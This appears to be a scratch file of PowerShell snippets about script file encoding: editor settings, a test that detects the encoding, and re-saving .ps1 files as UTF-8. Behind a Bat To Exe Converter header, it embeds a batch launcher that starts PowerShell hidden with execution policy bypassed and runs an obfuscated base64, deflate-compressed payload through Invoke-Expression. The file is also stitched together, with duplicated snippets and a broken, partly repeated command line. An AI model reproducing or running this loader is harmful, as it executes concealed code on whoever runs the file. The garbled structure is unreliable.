::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdDWDJE+F5n48IRloWgGLMFe1E6EM/fzH/OWSsE4YaNERSMHewrHu
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983

Write-Host "Hello, GG!"
"files.encoding": "utf8bom"

"[powershell]": {
    "files.encoding": "utf8bom",
    "files.autoGuessEncoding": true
}
Get-Service | Where-Object {$_.Status -eq â€œRunningâ€} | Select-Object Name

$badBytes = [byte[]]@(0xC3, 0x80)
$utf8Str = [System.Text.Encoding]::UTF8.GetString($badBytes)
$bytes = [System.Text.Encoding]::ASCII.GetBytes('Write-Output') + [byte[]]@(0xC3, 0x80) + [byte[]]@(0x22)
$path = Join-Path ([System.IO.Path]::GetTempPath()) 'encodingtest.ps1'

try
{
    [System.IO.File]::WriteAllBytes($path, $bytes)

    switch (& $path)
    {
        $utf8Str
        {
            return 'UTF-8'
            break
        }

        default
        {
            return 'Windows-1252'
            break
        }
    }
}
finally
{
    Remove-Item $path
}

[psobject].Assembly.GetTypes() | Where-Object { $_.Name -eq 'ClrFacade'} |
  ForEach-Object {
    $_.GetMethod('GetDefaultEncoding', [System.Reflection.BindingFlags]'nonpublic,static').Invoke($null, @())
  }


  Get-ChildItem *.ps1 -Recurse | ForEach-Object {
    $content = Get-Content -Path $_
    Set-Content -Path $_.Fullname -Value $content -Encoding UTF8 -PassThru -Force
}

@echo off
if %PROCESSOR_ARCHITECTURE%==x64 (%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVPbTttAEH33V4wsS9iKbTkhoDQIiZvSIrUpIqh9iPLgbAayZb1r7Y6TGJp/7xictiBaVX069u7MOWcuGwg4hhPfm14odVmUxlLo36PVqPZ76UIpP5pBWc2VFOAoJwbcEN/DpaYrsvBFWqpydaqUEWF7to6hkppg02Ld4kN09N865xZzwpslw2KnU7W8qxh+Kbdfv2m3J426f+KRrR8Dx0WPcZ18nn9DQTCpHWGRjpHSiRH3SK5FCKdv3J0uFhadG+WFVPVsOGQBtBywNvY+hrcynvGmLpHDJ8RFFG8HXllDRhjVht6IMvICl54brdlouNd910u7h4P04DDtZr29GAbZIIvgO5iKEl0pdQRBycVNT63NG2/PfbvU3FQtMPTnNaEfQz/iwA0HMvk1CpQrDIPyFdED32deUP8D3/RMEptcoeVWNMYNN2W/x5xxFnUOGrV6ms0aws3ZyFsvpUIIWSFR9PfkCB4bJ52XVus4eOgcxN34z90eqfzOMdvYaIxg690ay4ryuMteJOsi9JuvTocV2FwgG3c7uleO3iOdcaEunPJOzdjIh1wvFEaclXRnWy8gzuW1SJq5QVJgMUd7gbdSS5JGQyAgGecFgv9V6v2eD4nmP1fmAuHpZFRp0UQ6SMrcOVraqhnQcUDD4YsnlsVBnX5EfUfLONvsZ1nG0M8ib+f8utIkC0yfltKUE7QrKdCln3LrlrlqRmjKuukgZDy358cxC4NNumt7FMXwU4TXj3ZTb18fK8bBJm7g1epNKLeUTBRiCckEhdELGBz2s2wrchLLx+0P\")))), [IO.Compression.CompressionMode]::Decompress)), powershell.exe -NoP -NonI -W Hidden -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream  (else (,$([Convert]::FromBase64String(\"nVPbTttAEH33V4wsS9iKbTkhoDQIiZvSIrUpIqh9iPLgbAayZb1r7Y6TGJp/7xictiBaVX069u7MOWcuGwg4hhPfm14odVmUxlLo36PVqPZ76UIpP5pBWc2VFOAoJwbcEN/DpaYrsvBFWqpydaqUEWF7to6hkppg02Ld4kN09N865xZzwpslw2KnU7W8qxh+Kbdfv2m3J426f+KRrR8Dx0WPcZ18nn9DQTCpHWGRjpHSiRH3SK5FCKdv3J0uFhadG+WFVPVsOGQBtBywNvY+hrcynvGmLpHDJ8RFFG8HXllDRhjVht6IMvICl54brdlouNd910u7h4P04DDtZr29GAbZIIvgO5iKEl0pdQRBycVNT63NG2/PfbvU3FQtMPTnNaEfQz/iwA0HMvk1CpQrDIPyFdED32deUP8D3/RMEptcoeVWNMYNN2W/x5xxFnUOGrV6ms0aws3ZyFsvpUIIWSFR9PfkCB4bJ52XVus4eOgcxN34z90eqfzOMdvYaIxg690ay4ryuMteJOsi9JuvTocV2FwgG3c7uleO3iOdcaEunPJOzdjIh1wvFEaclXRnWy8gzuW1SJq5QVJgMUd7gbdSS5JGQyAgGecFgv9V6v2eD4nmP1fmAuHpZFRp0UQ6SMrcOVraqhnQcUDD4YsnlsVBnX5EfUfLONvsZ1nG0M8ib+f8utIkC0yfltKUE7QrKdCln3LrlrlqRmjKuukgZDy358cxC4NNumt7FMXwU4TXj3ZTb18fK8bBJm7g1epNKLeUTBRiCckEhdELGBz2s2wrchLLx+0P\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();") 



Write-Host "Hello, GG!"
"files.encoding": "utf8bom"

"[powershell]": {
    "files.encoding": "utf8bom",
    "files.autoGuessEncoding": true
}
Get-Service | Where-Object {$_.Status -eq â€œRunningâ€} | Select-Object Name

$badBytes = [byte[]]@(0xC3, 0x80)
$utf8Str = [System.Text.Encoding]::UTF8.GetString($badBytes)
$bytes = [System.Text.Encoding]::ASCII.GetBytes('Write-Output') + [byte[]]@(0xC3, 0x80) + [byte[]]@(0x22)
$path = Join-Path ([System.IO.Path]::GetTempPath()) 'encodingtest.ps1'

try
{
    [System.IO.File]::WriteAllBytes($path, $bytes)

    switch (& $path)
    {
        $utf8Str
        {
            return 'UTF-8'
            break
        }

        default
        {
            return 'Windows-1252'
            break
        }
    }
}
finally
{
    Remove-Item $path
}

[psobject].Assembly.GetTypes() | Where-Object { $_.Name -eq 'ClrFacade'} |
  ForEach-Object {
    $_.GetMethod('GetDefaultEncoding', [System.Reflection.BindingFlags]'nonpublic,static').Invoke($null, @())
  }


  Get-ChildItem *.ps1 -Recurse | ForEach-Object {
    $content = Get-Content -Path $_
    Set-Content -Path $_.Fullname -Value $content -Encoding UTF8 -PassThru -Force
}
[Text.Encoding]::ASCII)).ReadToEnd();")